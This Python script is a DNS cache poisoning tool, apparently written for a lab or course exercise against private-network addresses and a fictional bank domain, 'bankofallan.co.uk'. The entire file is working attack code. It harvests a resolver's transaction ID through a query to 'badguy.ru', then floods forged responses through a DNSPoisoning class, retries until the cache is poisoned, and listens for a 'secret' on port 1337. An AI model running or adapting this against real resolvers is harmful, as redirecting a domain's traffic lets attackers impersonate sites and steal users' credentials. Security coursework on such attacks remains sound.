#! /usr/bin/env python3

import dns.resolver
from dns.resolver import NoAnswer

import multiprocessing
import random #For generating random ID

import time
import socket
import sys
import signal

from blessings import Terminal #For terminal threading

from multiprocessing.pool import ThreadPool
import logging
import threading
from threading import Thread

from dns_poisoning import DNSPoisoning


#TODO: Check if the victim server is authoritative, because in this case the attack cannot be carried on
#TODO: Check if the victim use recursive query resolution, otherwise the attac k will not work
#TODO: Fetch authoritative zone for the attacked domain to get NS



#Logging function
def log(msg):
    #Implement a regex to {t.*} char from the 'msg' string in case of no coloured text
    if verbosity > 0:
        print(msg.format(t=term))
        

class InitialQueryFailed(Exception):
    #Raised when initial query performed to get a TXID fails
    pass


def get_id(udp_ip, udp_port):

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
    sock.bind((udp_ip, udp_port))

    print("Listening for incoming DNS request...")

    while True:
        data, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
        print("Received response:", data)
        received_id = data[0:2]

        initial_id = int.from_bytes(received_id, byteorder='big')

        print("RAW ID: ", received_id)
        print("ID: ", initial_id)

        sock.close()

        return initial_id
   

def sigint_handler(sig, frame):
    log("Stopping secret fetcher thread...")
    secret_fetch_flag = False
    secret_thread.join()
    print("Exiting...")
    sys.exit(0)

      

def send_initial_query(victim_server_ip):

    victim_server = dns.resolver.Resolver()
    victim_server.nameservers = [victim_server_ip]

    try:
        myAnswers = victim_server.query("badguy.ru", "A")
        for rdata in myAnswers:
                log(rdata)
    except:
        log("{t.red}{t.bold}Query failed{t.normal}".format(t=term))
        raise InitialQueryFailed


#Get IP of the NS server (Unimplemented)
def get_authoritative_server(domain, dns_server_ip):
    dns_server = dns.resolver.Resolver()
    dns_server.nameservers = [dns_server_ip]

    response = dns_server.query(domain, 'NS')
    if response.rrset is not None:
        ns_server = str(response.rrset)
        print("NS server(s): " + ns_server)

        response = dns_server.query(ns_server, 'A')


def secret_fetcher(server_ip, server_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
    sock.bind((server_ip, server_port))

    print("({t.bold}secret fetcher{t.normal}) Listening for incoming message...".format(t=term))

    while secret_fetch_flag:
        data, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
        print("({t.bold}secret fetcher{t.normal})Received response:{msg}".format(msg=data, t=term))
    



term = Terminal()
secret_fetch_flag = True

print("\n{t.bold}DNS Cache Poisoning Tool{t.normal}\n".format(t=term))



verbosity = 1

victim_server_ip = '192.168.56.3'

domain = 'bankofallan.co.uk'


#Bad Guy
bad_udp_port = 55553
bad_udp_ip = '192.168.56.1'


#Lauch the secret fetcher
secret_thread = Thread(target=secret_fetcher, args = (bad_udp_ip, 1337))
secret_thread.start()


number_of_tries = 50
succeded = False

while number_of_tries and not succeded:

    time.sleep(3)

    log("\n ------ {t.bold}{t.shadow}Attack Number {num}{t.normal} ------\n".format(t=term, num=abs(number_of_tries-20)))


    pool = ThreadPool(processes=1)

    log("Starting DNS light server")
    async_id_result = pool.apply_async(get_id, (bad_udp_ip, bad_udp_port))

    time.sleep(2)
    
    log("\n\nStart sending the first request to \"{t.italic}badguy.ru{t.normal}\"".format(t=term))
    try:
        send_initial_query(victim_server_ip) #Start the DNS listening server
    except InitialQueryFailed:
        log("\n{t.red}Unable to get inital TXID, terminating...{t.normal}".format(t=term))
        pool.terminate()    #Terminate the UDP server
        sys.exit(-1)

    fetched_id = async_id_result.get()  # get the return value from your function.

    log("Fetched ID: {t.green}{t.bold}{id}{t.normal}".format(t=term, id=fetched_id))

    log("Ok, the victim does not know the attack, let's try to perform \"{t.italic}Dan's Shenanigans{t.normal}\"".format(t=term))

    poison= DNSPoisoning(victim_server_ip, "bankofallan.co.uk", '192.168.56.1', '10.0.0.1', fetched_id, sigint_handler, log)

    #Attach SIGINT signal to the DNSPoisoning stop handler
    signal.signal(signal.SIGINT, poison.stop_handler)


    poison.send_inital_query()

    log("Now the victim server wait for response, we {t.underline}flood a mass of crafted request{t.normal}...".format(t=term))

    poison.start_flooding()

    time.sleep(5)

    log("Checking the attack results")
    if poison.check_poisoning():
        log("\n\nAttack Succeded!!!!")
        succeded = True
    else:
        log("\n\n{t.red}{t.bold}Attack Failed{t.normal}!!!!".format(t=term))
        number_of_tries = number_of_tries - 1